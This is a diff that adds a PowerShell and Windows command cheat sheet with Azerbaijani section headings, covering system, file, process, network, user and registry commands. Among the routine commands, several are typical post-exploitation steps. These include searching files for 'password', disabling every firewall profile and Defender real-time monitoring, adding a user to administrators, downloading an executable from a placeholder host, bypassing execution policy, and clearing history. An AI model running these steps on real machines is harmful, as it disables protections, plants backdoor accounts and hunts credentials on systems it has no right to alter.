@@ -1,1 +1,107 @@
+# Sistem / mühit
+hostname
+whoami
+whoami /groups
+whoami /priv
+$env:USERNAME
+$env:COMPUTERNAME
+$env:USERDOMAIN
+Get-ComputerInfo
+
+# Fayl və qovluqlar
+pwd
+ls
+dir
+cd ..
+cd C:\
+mkdir test
+rmdir test
+New-Item file.txt
+Remove-Item file.txt
+Copy-Item a.txt b.txt
+Move-Item a.txt C:\Temp\
+Get-Content file.txt
+Set-Content file.txt "test"
+Add-Content file.txt "test2"
+
+# Axtarış
+Get-ChildItem -Recurse
+Get-ChildItem -Recurse -Include *.txt
+Select-String "password" *.txt
+Select-String -Path *.config -Pattern "pass"
+
+# Proseslər
+Get-Process
+Get-Process | Sort-Object CPU -Descending
+Stop-Process -Id 1234
+tasklist
+taskkill /PID 1234 /F
+
+# Servislər
+Get-Service
+Get-Service | Where-Object {$_.Status -eq "Running"}
+Start-Service servicename
+Stop-Service servicename
+
+# Şəbəkə
+ipconfig
+ipconfig /all
+Get-NetIPConfiguration
+Get-NetIPAddress
+netstat -ano
+Test-Connection 8.8.8.8
+Resolve-DnsName google.com
+
+# Firewall
+Get-NetFirewallProfile
+Get-NetFirewallRule
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+
+# İstifadəçilər
+net user
+net user username
+net localgroup
+net localgroup administrators
+net user username password /add
+net localgroup administrators username /add
+
+# Scheduled Tasks
+schtasks
+schtasks /query
+Get-ScheduledTask
+
+# Registry
+reg query HKLM
+Get-ItemProperty HKLM:\Software
+Get-ChildItem HKLM:\Software
+
+# Download
+Invoke-WebRequest http://ip/file.exe -OutFile file.exe
+iwr http://ip/file.exe -OutFile file.exe
+
+# Execution Policy
+Get-ExecutionPolicy
+Set-ExecutionPolicy Bypass -Scope Process -Force
+
+# PowerShell Info
+$PSVersionTable
+Get-Command
+Get-Help
+Get-Help Get-Process -Examples
+
+# Privilege / Security
+Get-LocalUser
+Get-LocalGroup
+Get-LocalGroupMember Administrators
+Get-MpPreference
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+# Encoding / Base64
+[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("test"))
+[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("dGVzdA=="))
+
+# History / Logs
+Get-History
+Clear-History
+Get-EventLog -LogName Security -Newest 20
 
